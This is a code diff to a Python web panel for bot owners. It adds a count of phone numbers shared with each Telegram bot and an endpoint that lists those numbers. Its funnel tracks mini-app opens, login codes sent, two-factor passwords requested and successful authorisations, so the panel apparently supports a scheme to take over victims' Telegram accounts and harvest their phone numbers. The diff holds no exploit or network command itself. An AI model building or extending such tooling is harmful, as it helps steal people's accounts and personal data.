@@ -171,18 +171,42 @@ async def list_logs(
 # ===== bots =====
 
 def _funnel(tg_id: int | None) -> dict:
-    """4 счётчика воронки — точно та же логика, что в старой Telegram-карточке
-    (handlers/cards.py): opens = miniapp_launches, code_sent + pwd_requested +
-    success — из bot_auth_events."""
+    """Счётчики воронки. opens = miniapp_launches, contacts = phones shared,
+    code_sent/pwd_requested/success — из bot_auth_events."""
     if not tg_id:
-        return {"opens": 0, "code_sent": 0, "twofa_sent": 0, "auths": 0}
+        return {"opens": 0, "contacts": 0, "code_sent": 0, "twofa_sent": 0, "auths": 0}
     events = get_auth_event_counts(tg_id)
+    # Подсчёт контактов (уникальных юзеров по этому боту)
+    contacts_count = 0
+    try:
+        from database import _db, _lock
+        with _lock:
+            r = _db.one(
+                "SELECT COUNT(DISTINCT user_id) AS c FROM contacts WHERE bot_tg_id=?",
+                (tg_id,),
+            )
+            contacts_count = int((r or {}).get("c") or 0)
+    except Exception:
+        contacts_count = 0
     return {
         "opens": get_miniapp_launch_count(tg_id),
+        "contacts": contacts_count,
         "code_sent": int(events.get("code_sent", 0)),
         "twofa_sent": int(events.get("pwd_requested", 0)),
         "auths": int(events.get("success", 0)),
     }
+
+
+@router.get("/bots/{bot_id}/contacts")
+async def list_bot_contacts(bot_id: int, user: dict = Depends(verify_panel_user)) -> dict:
+    """Список телефонов, которыми поделились с ботом."""
+    from database import get_contacts
+    bot = _ensure_owner(bot_id, user["id"])
+    tg_id = bot.get("tg_id")
+    if not tg_id:
+        return {"count": 0, "items": []}
+    items = get_contacts(tg_id, limit=200)
+    return {"count": len(items), "items": items}
 
 
 def _bot_brief(bot: dict) -> dict:
